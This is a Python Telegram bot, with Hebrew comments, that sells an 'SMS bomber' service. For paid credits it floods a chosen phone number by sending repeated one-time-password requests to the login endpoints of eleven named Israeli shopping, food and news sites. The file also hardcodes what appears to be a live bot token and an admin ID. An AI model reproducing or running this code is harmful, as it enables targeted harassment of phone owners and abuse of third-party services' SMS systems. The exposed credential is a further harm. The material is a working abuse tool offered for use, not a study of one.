import telebot
import requests
import time
from flask import Flask
from threading import Thread
import os
import uuid
from datetime import datetime, timedelta

# --- שרת Flask לשמירה על הבוט בחיים ---
app = Flask('')
@app.route('/')
def home(): return "<h1>Turbo Bot 11 Sites - Ready</h1>"

def keep_alive():
    t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
    t.start()

# --- הגדרות בוט ומנהל ---
# הטוקן המעודכן ששלחת עכשיו
API_TOKEN = '8620606926:AAHt4U43py_KEDRwTwaqW35QqR_W6WFeEuY' 
ADMIN_ID = 7265913946  # צור דביר
bot = telebot.TeleBot(API_TOKEN)

user_data = {} 

def get_user(uid):
    if uid not in user_data:
        user_data[uid] = {'credits': 0, 'last_daily': None}
    return user_data[uid]

def attack(m, target, rounds):
    uid = m.from_user.id
    user = get_user(uid)
    
    # רשימת כל 11 האתרים
    apis = [
        {"n": "ACE", "u": "https://www.ace.co.il/login/prelogin/stepone", "d": {"form_key": "d0FvqBYicRoR6FlO", "newaut": "1", "phone": target, "addintinalInfo": ""}, "type": "form", "ref": "https://www.ace.co.il/"},
        {"n": "Dominos", "u": "https://api.dominos.co.il/sendOtp", "d": {"phone": target}, "type": "json", "ref": "https://www.dominos.co.il/"},
        {"n": "Hoodies", "u": "https://www.hoodies.co.il/customer/ajax/post/", "d": {"form_key": "HOnq3cnFQBxVH6HZ", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form", "ref": "https://www.hoodies.co.il/"},
        {"n": "Mishloha", "u": "https://www.mishloha.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json", "ref": "https://www.mishloha.co.il/"},
        {"n": "Fox Home", "u": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.foxhome.co.il/"},
        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.laline.co.il/"},
        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://footlocker.co.il/"},
        {"n": "Fox", "u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://fox.co.il/"},
        {"n": "Walla", "u": "https://mazaltov.walla.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json", "ref": "https://mazaltov.walla.co.il/"},
        {"n": "Be Pharm", "u": "https://www.be-pharm.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json", "ref": "https://www.be-pharm.co.il/"},
        {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json", "ref": "https://www.hamal.co.il/"}
    ]

    for r in range(int(rounds)):
        if user['credits'] <= 0:
            bot.send_message(m.chat.id, "❌ No Credits left!")
            break
        
        user['credits'] -= 1
        success_count = 0
        for site in apis:
            try:
                h = {"User-Agent": "Mozilla/5.0", "Referer": site["ref"]}
                if site["type"] == "json":
                    res = requests.post(site["u"], json=site["d"], headers=h, timeout=1.5)
                else:
                    res = requests.post(site["u"], data=site["d"], headers=h, timeout=1.5)
                if res.status_code in [200, 201, 204]: success_count += 1
            except: pass
        
        bot.send_message(m.chat.id, f"⚡️ Round {r+1} | Success: {success_count}/{len(apis)} | Bal: {user['credits']}")
        if r < int(rounds) - 1: time.sleep(0.1)

    bot.send_message(m.chat.id, "🏁 Done!")

# --- פקודות ---

@bot.message_handler(commands=['start'])
def start(m):
    welcome = (
        "👋 בוט הספאם המהיר של צור!\n\n"
        "👑 מנכ\"ל: @Tzur_Dvir\n"
        "💳 מחירון: 100 קרדיטים ב-10₪\n\n"
        "💰 /me - יתרה ו-ID\n"
        "🎁 /daily - מתנה יומית (10)\n"
        "💸 /send [ID] [כמות] - העברה לחבר\n\n"
        "🚀 הפעלה: [סבבים] [טלפון]\n"
        "דוגמה: 3 0521234567"
    )
    bot.send_message(m.chat.id, welcome)

@bot.message_handler(commands=['me'])
def me(m):
    u = get_user(m.from_user.id)
    bot.send_message(m.chat.id, f"👤 ID: {m.from_user.id}\n💰 Credits: {u['credits']}")

@bot.message_handler(commands=['daily'])
def daily(m):
    u = get_user(m.from_user.id)
    now = datetime.now()
    if u['last_daily'] and now < u['last_daily'] + timedelta(days=1):
        bot.reply_to(m, "❌ Tomorrow!")
    else:
        u['credits'] += 10
        u['last_daily'] = now
        bot.reply_to(m, "🎁 +10 Credits!")

@bot.message_handler(commands=['add'])
def add(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        p = m.text.split()
        target = get_user(int(p[1]))
        target['credits'] += int(p[2])
        bot.reply_to(m, f"✅ Added {p[2]} to {p[1]}")
    except: pass

@bot.message_handler(commands=['send'])
def send_credits(m):
    u = get_user(m.from_user.id)
    try:
        p = m.text.split()
        tid, amt = int(p[1]), int(p[2])
        if amt <= 0 or u['credits'] < amt: return
        t_user = get_user(tid)
        u['credits'] -= amt
        t_user['credits'] += amt
        bot.reply_to(m, f"✅ Sent {amt} to {tid}")
    except: pass

@bot.message_handler(func=lambda m: True)
def handle(m):
    try:
        p = m.text.split()
        if len(p) == 2 and p[0].isdigit():
            attack(m, p[1], p[0])
    except: pass

if __name__ == "__main__":
    keep_alive()
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20, drop_pending_updates=True)
        except Exception:
            time.sleep(5)
